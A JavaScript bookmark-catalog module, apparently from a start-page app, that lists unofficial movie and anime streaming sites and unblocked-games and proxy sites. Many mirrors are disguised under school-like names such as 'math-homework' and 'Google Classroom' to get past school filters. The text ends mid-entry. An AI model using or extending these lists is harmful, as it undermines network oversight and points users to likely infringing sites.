/* One canonical built-in catalog and review engine for all bookmark readers. */
(function(root,factory){
  if(typeof module==='object' && module.exports) module.exports=factory(require('./heavenly-navigation'),require('./heavenly-official-order'),require('./heavenly-collections'),require('./heavenly-picks'));
  else root.HeavenlyCatalog=factory(root.HeavenlyNavigation,root.HeavenlyOfficialOrder,root.HeavenlyCollections,root.HeavenlyPicks);
}(typeof self!=='undefined'?self:this,function(navigation,officialOrder,collections,publishedPicks){
  'use strict';
  var defaults = {
  "categories": [
    {
      "id": "cat_movies",
      "title": "Movies/Shows",
      "side": "left",
      "order": 0,
      "builtIn": true,
      "hidden": false,
      "subSections": [
        {
          "id": "builtin",
          "title": "Built-In",
          "builtIn": true
        },
        {
          "id": "naenae",
          "title": "Nae-Nae",
          "builtIn": true,
          "defaultCollapsed": true
        },
        {
          "id": "user",
          "title": "Your Bookmarks",
          "builtIn": true
        }
      ]
    },
    {
      "id": "cat_anime",
      "title": "Anime/Manga",
      "side": "right",
      "order": 0,
      "builtIn": true,
      "hidden": false,
      "subSections": [
        {
          "id": "builtin",
          "title": "Built-In",
          "builtIn": true
        },
        {
          "id": "user",
          "title": "Your Bookmarks",
          "builtIn": true
        }
      ]
    },
    {
      "id": "cat_games",
      "title": "Games",
      "side": "bottom",
      "order": 0,
      "builtIn": true,
      "hidden": false,
      "subSections": [
        {
          "id": "builtin",
          "title": "Built-In",
          "builtIn": true
        },
        {
          "id": "user",
          "title": "Your Bookmarks",
          "builtIn": true
        }
      ]
    },
    {
      "id": "cat_op_websites",
      "title": "OP Websites",
      "side": "bottom",
      "order": 1,
      "builtIn": true,
      "hidden": false,
      "subSections": [
        {
          "id": "browser_games",
          "title": "Browser/Games",
          "icon": "globe",
          "builtIn": true
        },
        {
          "id": "docs_games",
          "title": "Docs/Games",
          "icon": "file-text",
          "builtIn": true
        },
        {
          "id": "user",
          "title": "Your Bookmarks",
          "builtIn": false
        }
      ]
    }
  ],
  "bookmarks": [
    {
      "id": "bm_everythingmoe",
      "categoryId": "cat_anime",
      "title": "EverythingMoe",
      "url": "https://everythingmoe.com/",
      "type": "bookmark",
      "icon": "/proxy/https://everythingmoe.com/favicon.ico",
      "builtIn": true,
      "hidden": false,
      "order": 0,
      "subBookmarks": []
    },
    {
      "id": "bm_fmhy_anime",
      "categoryId": "cat_anime",
      "title": "FMHY: Anime",
      "url": "https://fmhy.net/video#anime-streaming",
      "type": "bookmark",
      "icon": "/assets/icons/fmhy-halloween-icon.png",
      "builtIn": true,
      "hidden": false,
      "order": 1,
      "subBookmarks": []
    },
    {
      "id": "bm_anisnatch",
      "categoryId": "cat_anime",
      "title": "AniSnatch",
      "url": "https://anisnatch.top/",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=anisnatch.top&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 2,
      "subBookmarks": []
    },
    {
      "id": "bm_miruro",
      "categoryId": "cat_anime",
      "title": "Miruro",
      "url": "https://www.miruro.bz/",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=miruro.bz&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 3,
      "subBookmarks": []
    },
    {
      "id": "bm_aniclover",
      "categoryId": "cat_anime",
      "title": "AniClover",
      "url": "https://aniclover.cc/",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=aniclover.cc&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 4,
      "subBookmarks": []
    },
    {
      "id": "bm_anidb",
      "categoryId": "cat_anime",
      "title": "AniDB",
      "url": "https://anidb.se",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=anidb.se&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 5,
      "subBookmarks": []
    },
    {
      "id": "bm_movish_anime",
      "categoryId": "cat_anime",
      "title": "Movish",
      "url": "https://movish.to/",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=movish.to&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 7,
      "subBookmarks": [
        {
          "id": "sub_movish_latestmovies_anime",
          "title": "Latest Movies",
          "url": "https://latestmovies.net/",
          "icon": "https://www.google.com/s2/favicons?domain=latestmovies.net&sz=64"
        }
      ]
    },
    {
      "id": "bm_fmhy_movies",
      "categoryId": "cat_movies",
      "title": "FMHY: Movies",
      "url": "https://fmhy.net/video",
      "type": "bookmark",
      "icon": "/assets/icons/fmhy-halloween-icon.png",
      "builtIn": true,
      "hidden": false,
      "order": 0,
      "subBookmarks": []
    },
    {
      "id": "bm_streamopro",
      "categoryId": "cat_movies",
      "title": "Streamo",
      "url": "https://streamo.pro/",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=streamo.pro&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 1,
      "subBookmarks": []
    },
    {
      "id": "bm_movish_movies",
      "categoryId": "cat_movies",
      "title": "Movish",
      "url": "https://movish.to/",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=movish.to&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 2,
      "subBookmarks": [
        {
          "id": "sub_movish_latestmovies_movies",
          "title": "Latest Movies",
          "url": "https://latestmovies.net/",
          "icon": "https://www.google.com/s2/favicons?domain=latestmovies.net&sz=64"
        }
      ]
    },
    {
      "id": "bm_7movies",
      "categoryId": "cat_movies",
      "title": "7Movies",
      "url": "https://7movies.in/",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=7movies.in&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 3,
      "subBookmarks": []
    },
    {
      "id": "bm_rivestream",
      "categoryId": "cat_movies",
      "title": "RiveStream",
      "url": "https://www.rivestream.app/",
      "type": "bookmark",
      "icon": "/proxy/https://www.rivestream.app/icons/icon-192x192.png",
      "builtIn": true,
      "hidden": false,
      "order": 4,
      "subBookmarks": []
    },
    {
      "id": "bm_zig_and_sharko",
      "categoryId": "cat_movies",
      "subSectionId": "naenae",
      "title": "Zig & Sharko",
      "url": "https://www.youtube.com/results?search_query=zig+and+sharko+full+episodes",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=youtube.com&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 0,
      "subBookmarks": []
    },
    {
      "id": "bm_larva",
      "categoryId": "cat_movies",
      "subSectionId": "naenae",
      "title": "Larva",
      "url": "https://www.youtube.com/results?search_query=larva+full+episodes",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=youtube.com&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 1,
      "subBookmarks": []
    },
    {
      "id": "bm_spongebob",
      "categoryId": "cat_movies",
      "subSectionId": "naenae",
      "title": "SpongeBob",
      "url": "https://www.youtube.com/results?search_query=spongebob+full+episodes",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=youtube.com&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 2,
      "subBookmarks": []
    },
    {
      "id": "bm_individual_games",
      "categoryId": "cat_games",
      "title": "Individual Games",
      "url": "",
      "type": "folder",
      "icon": "preset:gamepad",
      "builtIn": true,
      "hidden": false,
      "order": 0,
      "subBookmarks": [
        {
          "id": "sub_slopeplus",
          "title": "Slope Plus",
          "url": "https://lonfro.github.io/SlopePlusWeb/",
          "icon": "https://www.google.com/s2/favicons?domain=lonfro.github.io&sz=64"
        },
        {
          "id": "sub_whatbeatsrock",
          "title": "What Beats Rock",
          "url": "https://www.whatbeatsrock.com/",
          "icon": "https://www.google.com/s2/favicons?domain=whatbeatsrock.com&sz=64"
        },
        {
          "id": "sub_fnf",
          "title": "Friday Night Funkin",
          "url": "https://luckydog7.github.io/funkinmobile/game/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=luckydog7.github.io&sz=64"
        },
        {
          "id": "sub_geometrydash",
          "title": "Geometry Dash",
          "url": "https://web-dashers.github.io/",
          "icon": "https://www.google.com/s2/favicons?domain=web-dashers.github.io&sz=64"
        }
      ]
    },
    {
      "id": "bm_ng",
      "categoryId": "cat_games",
      "title": "Newgrounds",
      "url": "https://newgrounds.com",
      "type": "folder_bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=newgrounds.com&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 1,
      "subBookmarks": []
    },
    {
      "id": "bm_sitesdotcom",
      "categoryId": "cat_games",
      "title": "SitesDotCom",
      "url": "https://games-b3749.web.app/",
      "type": "bookmark",
      "icon": "data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2280%22>%F0%9F%A5%94</text></svg>",
      "builtIn": true,
      "hidden": false,
      "order": 2,
      "subBookmarks": []
    },
    {
      "id": "bm_grind1",
      "categoryId": "cat_games",
      "title": "GRIND1",
      "url": "https://zbr.base44.app",
      "type": "bookmark",
      "icon": "/proxy/https://yt3.googleusercontent.com/5pXcUZ6ujlD2Cd0loksX2Ju59RtAnfRS4lEG7uf6sd2yemKG33uu2x-31VrU08xAfpEGsUoVGSo=s160-c-k-c0x00ffffff-no-rj",
      "builtIn": true,
      "hidden": false,
      "order": 3,
      "subBookmarks": []
    },
    {
      "id": "bm_gn_math",
      "categoryId": "cat_games",
      "title": "GN Math",
      "url": "https://gn-math.dev/",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=gn-math.dev&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 4,
      "subBookmarks": []
    },
    {
      "id": "bm_history_minds",
      "categoryId": "cat_games",
      "subSectionId": "builtin",
      "title": "History Minds",
      "url": "https://historyminds.com/activities",
      "type": "bookmark",
      "icon": "preset:globe",
      "builtIn": true,
      "hidden": false,
      "order": 5,
      "subBookmarks": []
    },
    {
      "id": "bm_dancing_bunny",
      "categoryId": "cat_games",
      "subSectionId": "builtin",
      "title": "Dancing Bunny",
      "url": "https://cdn.jsdelivr.net/gh/ltorl/dancing-bunny/index.svg",
      "type": "bookmark",
      "icon": "preset:sparkles",
      "builtIn": true,
      "hidden": false,
      "order": 6,
      "subBookmarks": []
    },
    {
      "id": "bm_gamebois",
      "categoryId": "cat_games",
      "title": "Gamebois",
      "url": "https://teddblue.github.io/gamebois/",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=teddblue.github.io&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 5,
      "subBookmarks": []
    },
    {
      "id": "bm_ubg98",
      "categoryId": "cat_games",
      "title": "UBG98",
      "url": "https://ubg98.com",
      "type": "folder_bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=ubg98.com&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 6,
      "subBookmarks": []
    },
    {
      "id": "bm_cpsgames",
      "categoryId": "cat_games",
      "title": "CPS Games",
      "url": "https://cpsgames.org/",
      "type": "folder_bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=cpsgames.org&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 7,
      "subBookmarks": []
    },
    {
      "id": "bm_ubgames",
      "categoryId": "cat_games",
      "title": "UBGames",
      "url": "https://ubgames.uk",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=ubgames.uk&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 8,
      "subBookmarks": []
    },
    {
      "id": "bm_unbleeked",
      "categoryId": "cat_games",
      "title": "Unbleeked",
      "url": "https://unbleeked.vercel.app/",
      "type": "folder_bookmark",
      "icon": "preset:sparkles",
      "builtIn": true,
      "hidden": false,
      "order": 9,
      "subBookmarks": []
    },
    {
      "id": "bm_duckmath",
      "categoryId": "cat_games",
      "title": "DuckMath",
      "url": "https://duckmath.org/",
      "type": "folder_bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=duckmath.org&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 10,
      "disableQuickSaveWidget": true,
      "subBookmarks": [
        {
          "id": "sub_duckmath_a1",
          "title": "DuckMath a1",
          "url": "https://classroom-a1.b-cdn.net/",
          "icon": "https://www.google.com/s2/favicons?domain=duckmath.org&sz=64"
        }
      ]
    },
    {
      "id": "bm_emubrowser",
      "categoryId": "cat_games",
      "title": "EmuBrowser",
      "url": "https://emubrowser.com/",
      "type": "folder_bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=emubrowser.com&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 11,
      "subBookmarks": []
    },
    {
      "id": "bm_gras2027",
      "categoryId": "cat_games",
      "title": "Gras 2027",
      "url": "https://www.gras2027.com/",
      "type": "folder_bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=gras2027.com&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 12,
      "subBookmarks": []
    },
    {
      "id": "bm_funkymods",
      "categoryId": "cat_games",
      "title": "Funky Mods",
      "url": "https://funkymods.github.io/",
      "type": "bookmark",
      "icon": "preset:sparkles",
      "builtIn": true,
      "hidden": false,
      "order": 13,
      "subBookmarks": []
    },
    {
      "id": "bm_myretrogames",
      "categoryId": "cat_games",
      "title": "My RETROGAMES",
      "url": "https://theooofficial.github.io/myRETROGAMES/",
      "type": "folder_bookmark",
      "icon": "preset:gamepad",
      "builtIn": true,
      "hidden": false,
      "order": 14,
      "subBookmarks": []
    },
    {
      "id": "bm_mgalternative",
      "categoryId": "cat_games",
      "title": "Mountain Games",
      "url": "https://mgalternative.github.io",
      "type": "folder_bookmark",
      "icon": "preset:star",
      "builtIn": true,
      "hidden": false,
      "order": 15,
      "subBookmarks": []
    },
    {
      "id": "bm_masonsunblockedgames",
      "categoryId": "cat_games",
      "title": "Mason's Unblocked Games",
      "url": "https://masonsunblockedgames.github.io/MasonsUnblockedGames/",
      "type": "bookmark",
      "icon": "/proxy/https://masonsunblockedgames.github.io/MasonsUnblockedGames/favicon.ico",
      "builtIn": true,
      "hidden": false,
      "order": 16,
      "subBookmarks": []
    },
    {
      "id": "bm_geometryspot",
      "categoryId": "cat_games",
      "title": "Geometry Spot",
      "url": "https://geometryspot.com/activities/",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=geometryspot.com&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 17,
      "subBookmarks": []
    },
    {
      "id": "bm_outredgames",
      "categoryId": "cat_games",
      "title": "Outred Games",
      "url": "https://outred.org/games.html",
      "type": "folder_bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=outred.org&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 18,
      "subBookmarks": []
    },
    {
      "id": "bm_interdimensional_lite",
      "categoryId": "cat_games",
      "title": "Interdimensional Lite",
      "url": "https://pinkdev.d13qic2f6zga3.amplifyapp.com",
      "type": "folder_bookmark",
      "icon": "/proxy/https://pinkdev.d13qic2f6zga3.amplifyapp.com/favicon.png",
      "builtIn": true,
      "hidden": false,
      "order": 19,
      "subBookmarks": []
    },
    {
      "id": "bm_3hk0lite",
      "categoryId": "cat_games",
      "title": "3hk0 Lite",
      "url": "https://75kh0.github.io",
      "type": "folder_bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=75kh0.github.io&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 20,
      "subBookmarks": []
    },
    {
      "id": "bm_bloxcraftstudios",
      "categoryId": "cat_games",
      "title": "Bloxcraft Studios",
      "url": "https://bloxcraft-ubg.pages.dev",
      "type": "bookmark",
      "icon": "/proxy/https://5kh0.github.io/bloxcraft_transparent.png",
      "builtIn": true,
      "hidden": false,
      "order": 21,
      "subBookmarks": [
        {
          "id": "sub_bloxcraft_5kh0",
          "title": "Bloxcraft (5kh0)",
          "url": "https://5kh0.github.io",
          "icon": ""
        },
        {
          "id": "sub_bloxcraft_fastly",
          "title": "Bloxcraft (Fastly)",
          "url": "https://bloxcraftubg.freetls.fastly.net/games/",
          "icon": "https://www.google.com/s2/favicons?domain=bloxcraftubg.freetls.fastly.net&sz=64"
        }
      ]
    },
    {
      "id": "bm_coolmath",
      "categoryId": "cat_games",
      "title": "Coolmath Games",
      "url": "https://www.coolmathgames.com/",
      "type": "bookmark",
      "icon": "/assets/icons/coolmath-icon.ico",
      "builtIn": true,
      "hidden": false,
      "order": 22,
      "subBookmarks": []
    },
    {
      "id": "bm_aether",
      "categoryId": "cat_op_websites",
      "subSectionId": "browser_games",
      "title": "Aether",
      "url": "https://actstudy.s3.us-east-1.amazonaws.com/index.html",
      "type": "folder_bookmark",
      "icon": "/assets/icons/aether-icon.png",
      "builtIn": true,
      "hidden": false,
      "order": 0,
      "subBookmarks": [
        {
          "id": "sub_aether_1",
          "title": "Dogestudy Mirror",
          "url": "https://dogestudy.aether.samirchand.com.np/",
          "icon": "https://www.google.com/s2/favicons?domain=dogestudy.aether.samirchand.com.np&sz=64"
        },
        {
          "id": "sub_aether_2",
          "title": "AetherK12 S3 Mirror 1",
          "url": "https://aetherk12.s3.amazonaws.com/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=aetherk12.s3.amazonaws.com&sz=64"
        },
        {
          "id": "sub_aether_3",
          "title": "AetherK12 S3 Mirror 2",
          "url": "https://s3.amazonaws.com/aetherk12/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=s3.amazonaws.com&sz=64"
        },
        {
          "id": "sub_aether_4",
          "title": "AdvancedAlg2 S3 Mirror 1",
          "url": "https://advancedalg2.s3.amazonaws.com/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=advancedalg2.s3.amazonaws.com&sz=64"
        },
        {
          "id": "sub_aether_5",
          "title": "AdvancedAlg2 S3 Mirror 2",
          "url": "https://s3.amazonaws.com/advancedalg2/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=s3.amazonaws.com&sz=64"
        },
        {
          "id": "sub_aether_6",
          "title": "SchoolCDN S3 Mirror",
          "url": "https://schoolcdn.s3.amazonaws.com/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=schoolcdn.s3.amazonaws.com&sz=64"
        },
        {
          "id": "sub_aether_7",
          "title": "AetherK12 US-East-1 Mirror",
          "url": "https://s3.us-east-1.amazonaws.com/aetherk12/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=s3.us-east-1.amazonaws.com&sz=64"
        },
        {
          "id": "sub_aether_8",
          "title": "AdvancedAlg2 US-East-1 Mirror",
          "url": "https://advancedalg2.s3.us-east-1.amazonaws.com/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=advancedalg2.s3.us-east-1.amazonaws.com&sz=64"
        },
        {
          "id": "sub_aether_9",
          "title": "SchoolCDN Dualstack Mirror",
          "url": "https://schoolcdn.s3.dualstack.us-east-1.amazonaws.com/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=schoolcdn.s3.dualstack.us-east-1.amazonaws.com&sz=64"
        },
        {
          "id": "sub_aether_10",
          "title": "SchoolCDN FIPS Mirror",
          "url": "https://schoolcdn.s3-fips.us-east-1.amazonaws.com/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=schoolcdn.s3-fips.us-east-1.amazonaws.com&sz=64"
        },
        {
          "id": "sub_aether_11",
          "title": "ACTStudy S3 Mirror 1",
          "url": "https://actstudy.s3.amazonaws.com/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=actstudy.s3.amazonaws.com&sz=64"
        },
        {
          "id": "sub_aether_12",
          "title": "ACTStudy S3 Mirror 2",
          "url": "https://s3.amazonaws.com/actstudy/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=s3.amazonaws.com&sz=64"
        },
        {
          "id": "sub_aether_13",
          "title": "ACTStudy Dualstack Mirror",
          "url": "https://actstudy.s3.dualstack.us-east-1.amazonaws.com/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=actstudy.s3.dualstack.us-east-1.amazonaws.com&sz=64"
        },
        {
          "id": "sub_aether_14",
          "title": "ACTStudy US-East-1 Mirror",
          "url": "https://s3.us-east-1.amazonaws.com/actstudy/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=s3.us-east-1.amazonaws.com&sz=64"
        },
        {
          "id": "sub_aether_15",
          "title": "ACTStudy FIPS Mirror 1",
          "url": "https://actstudy.s3-fips.us-east-1.amazonaws.com/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=actstudy.s3-fips.us-east-1.amazonaws.com&sz=64"
        },
        {
          "id": "sub_aether_16",
          "title": "ACTStudy FIPS Mirror 2",
          "url": "https://actstudy.s3-fips.dualstack.us-east-1.amazonaws.com/index.html",
          "icon": "https://www.google.com/s2/favicons?domain=actstudy.s3-fips.dualstack.us-east-1.amazonaws.com&sz=64"
        }
      ]
    },
    {
      "id": "bm_korona",
      "categoryId": "cat_op_websites",
      "subSectionId": "browser_games",
      "title": "Korona",
      "url": "https://korona.lat/dashboard",
      "type": "bookmark",
      "icon": "https://www.google.com/s2/favicons?domain=korona.lat&sz=64",
      "builtIn": true,
      "hidden": false,
      "order": 1,
      "subBookmarks": []
    },
    {
      "id": "bm_nexus",
      "categoryId": "cat_op_websites",
      "subSectionId": "browser_games",
      "title": "Nexus",
      "url": "https://car-meow.github.io/toothbrush/",
      "type": "bookmark",
      "icon": "/assets/icons/nexus-icon.png",
      "builtIn": true,
      "hidden": false,
      "order": 2,
      "subBookmarks": []
    },
    {
      "id": "bm_flux",
      "categoryId": "cat_op_websites",
      "subSectionId": "browser_games",
      "title": "Flux",
      "url": "https://web.flux.focuznow.com/",
      "type": "folder_bookmark",
      "icon": "/proxy/https://web.flux.focuznow.com/assets/flux-mark.webp",
      "builtIn": true,
      "hidden": false,
      "order": 3,
      "subBookmarks": []
    },
    {
      "id": "bm_opium",
      "categoryId": "cat_op_websites",
      "subSectionId": "browser_games",
      "title": "Opium",
      "url": "https://opium.best/",
      "type": "folder_bookmark",
      "icon": "/assets/icons/opium-icon.png",
      "builtIn": true,
      "hidden": false,
      "order": 4,
      "subBookmarks": [
        {
          "id": "sub_opium_1",
          "title": "jsDelivr SVG Mirror",
          "url": "https://cdn.jsdelivr.net/gh/OpiumBest/svg/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=cdn.jsdelivr.net&sz=64"
        },
        {
          "id": "sub_opium_2",
          "title": "S3 OpiumBest Mirror",
          "url": "https://s3.amazonaws.com/opiumbest/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=s3.amazonaws.com&sz=64"
        },
        {
          "id": "sub_opium_3",
          "title": "OpiumBest S3 Host Mirror",
          "url": "https://opiumbest.s3.amazonaws.com/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=opiumbest.s3.amazonaws.com&sz=64"
        },
        {
          "id": "sub_opium_4",
          "title": "GCS OpiumBest Mirror",
          "url": "https://storage.googleapis.com/opiumbest/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=storage.googleapis.com&sz=64"
        },
        {
          "id": "sub_opium_5",
          "title": "OpiumBest GCS Host Mirror",
          "url": "https://opiumbest.storage.googleapis.com/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=opiumbest.storage.googleapis.com&sz=64"
        },
        {
          "id": "sub_opium_6",
          "title": "Statically SVG Mirror",
          "url": "https://cdn.statically.io/gh/OpiumBest/svg@main/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=cdn.statically.io&sz=64"
        },
        {
          "id": "sub_opium_7",
          "title": "GitHub Pages Mirror",
          "url": "https://opiumbest.github.io/",
          "icon": "https://www.google.com/s2/favicons?domain=opiumbest.github.io&sz=64"
        },
        {
          "id": "sub_opium_8",
          "title": "Bunny CDN SVG Mirror",
          "url": "https://jsdelivr.b-cdn.net/gh/OpiumBest/svg/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=jsdelivr.b-cdn.net&sz=64"
        },
        {
          "id": "sub_opium_9",
          "title": "esm.sh SVG Mirror",
          "url": "http://esm.sh/gh/OpiumBest/svg/icon.svg?raw",
          "icon": "https://www.google.com/s2/favicons?domain=esm.sh&sz=64"
        },
        {
          "id": "sub_opium_10",
          "title": "Clever Learning S3 Mirror",
          "url": "https://s3.amazonaws.com/cleverlearning/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=s3.amazonaws.com&sz=64"
        },
        {
          "id": "sub_opium_11",
          "title": "Clever Learning S3 Host Mirror",
          "url": "https://cleverlearning.s3.amazonaws.com/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=cleverlearning.s3.amazonaws.com&sz=64"
        },
        {
          "id": "sub_opium_12",
          "title": "Google Classroom GCS Mirror",
          "url": "https://storage.googleapis.com/gclassroom/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=storage.googleapis.com&sz=64"
        },
        {
          "id": "sub_opium_13",
          "title": "Google Classroom GCS Host Mirror",
          "url": "https://gclassroom.storage.googleapis.com/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=gclassroom.storage.googleapis.com&sz=64"
        },
        {
          "id": "sub_opium_14",
          "title": "OpiumBull S3 Mirror",
          "url": "https://s3.amazonaws.com/opiumbull/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=s3.amazonaws.com&sz=64"
        },
        {
          "id": "sub_opium_15",
          "title": "OpiumBull GCS Mirror",
          "url": "https://storage.googleapis.com/opiumbull/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=storage.googleapis.com&sz=64"
        },
        {
          "id": "sub_opium_16",
          "title": "jsDelivr Bull33 Mirror",
          "url": "https://cdn.jsdelivr.net/gh/opiumbest/bull33/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=cdn.jsdelivr.net&sz=64"
        },
        {
          "id": "sub_opium_17",
          "title": "esm.sh Bull33 Mirror",
          "url": "http://esm.sh/gh/OpiumBest/bull33/icon.svg?raw",
          "icon": "https://www.google.com/s2/favicons?domain=esm.sh&sz=64"
        },
        {
          "id": "sub_opium_18",
          "title": "Statically Bull33 Mirror",
          "url": "https://cdn.statically.io/gh/OpiumBest/bull33@main/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=cdn.statically.io&sz=64"
        },
        {
          "id": "sub_opium_19",
          "title": "OpiumBull S3 Host Mirror",
          "url": "https://opiumbull.s3.amazonaws.com/icon.svg",
          "icon": "https://www.google.com/s2/favicons?domain=opiumbull.s3.amazonaws.com&sz=64"
        },
        {
          "id": "sub_opium_20",
          "title": "jsDelivr NPM OpiumBest Mirror",
          "url": "https://cdn.jsdelivr.net/npm/opiumbest/index.svg",
          "icon": "https://www.google.com/s2/favicons?domain=cdn.jsdelivr.net&sz=64"
        },
        {
          "id": "sub_opium_21",
          "title": "jsDelivr NPM Classroom Mirror",
          "url": "https://cdn.jsdelivr.net/npm/classroomlearning/index.svg",
          "icon": "https://www.google.com/s2/favicons?domain=cdn.jsdelivr.net&sz=64"
        },
        {
          "id": "sub_opium_22",
          "title": "Topthink jsDelivr Mirror",
          "url": "https://jsdelivr.topthink.com/npm/opiumbest/index.svg",
          "icon": "https://www.google.com/s2/favicons?domain=jsdelivr.topthink.com&sz=64"
        }
      ]
    },
    {
      "id": "bm_polaris",
      "categoryId": "cat_op_websites",
      "subSectionId": "browser_games",
      "title": "Polaris",
      "url": "https://mathplayground.explosionlearning.org/",
      "type": "folder_bookmark",
      "icon": "/assets/polaris.svg",
      "builtIn": true,
      "hidden": false,
      "order": 5,
      "subBookmarks": [
        {
          "id": "sub_polaris_1",
          "title": "Goontopia Mirror",
          "url": "https://goontopia.me/",
          "icon": "https://www.google.com/s2/favicons?domain=goontopia.me&sz=64"
        },
        {
          "id": "sub_polaris_2",
          "title": "Polara Render 1",
          "url": "https://polara-1.onrender.com/",
          "icon": "https://www.google.com/s2/favicons?domain=polara-1.onrender.com&sz=64"
        },
        {
          "id": "sub_polaris_3",
          "title": "Polaris Foff Mirror",
          "url": "https://polarisisthebest.foff.ch/",
          "icon": "https://www.google.com/s2/favicons?domain=polarisisthebest.foff.ch&sz=64"
        },
        {
          "id": "sub_polaris_4",
          "title": "Puppypoop Flort Mirror",
          "url": "https://puppypoop.flort.com.tr/",
          "icon": "https://www.google.com/s2/favicons?domain=puppypoop.flort.com.tr&sz=64"
        },
        {
          "id": "sub_polaris_5",
          "title": "Polara Render 2",
          "url": "https://polara-i1r7.onrender.com/",
          "icon": "https://www.google.com/s2/favicons?domain=polara-i1r7.onrender.com&sz=64"
        },
        {
          "id": "sub_polaris_6",
          "title": "Downing DNS Mirror",
          "url": "https://poopoo.downingdns.xyz/",
          "icon": "https://www.google.com/s2/favicons?domain=poopoo.downingdns.xyz&sz=64"
        },
        {
          "id": "sub_polaris_7",
          "title": "Math Skills Algebra Mirror",
          "url": "https://mathskillsalgebra.pepikutan.net/",
          "icon": "https://www.google.com/s2/favicons?domain=mathskillsalgebra.pepikutan.net&sz=64"
        },
        {
          "id": "sub_polaris_8",
          "title": "Lafairs Mirror",
          "url": "https://lafairs.sh8.no/",
          "icon": "https://www.google.com/s2/favicons?domain=lafairs.sh8.no&sz=64"
        }
      ]
    },
    {
      "id": "bm_arctic",
      "categoryId": "cat_op_websites",
      "subSectionId": "browser_games",
      "title": "Arctic",
      "url": "https://storage.googleapis.com/math-homework/index.html",
      "type": "folder_bookmark",
      "icon": "/assets/icons/artic-icon.png",
      "builtIn": true,
      "hidden": false,
      "order": 6,
      "subBookmarks": [
        {
          "id": "sub_arctic_1",
          "title": "Arctic Games GCS",
          "url": "https://storage.googleapis.com/arctic-games/arctic.html",
          "icon": "https://www.google.com/s2/favicons?domain=storage.googleapis.com&sz=64"
        },
        {
          "id": "sub_arctic_2",
          "title": "Padlet Mirror",
          "url": "https://uploads-usc1.padletcdn.com/4865083536/4e7c634432b37bba781530a0802763b7/arctic.html#/home",
          "icon": "https://www.google.com/s2/favicons?domain=padletcdn.com&sz=64"
        },
        {
          "id": "sub_arctic_3",
          "title": "Pizza.com Mirror",
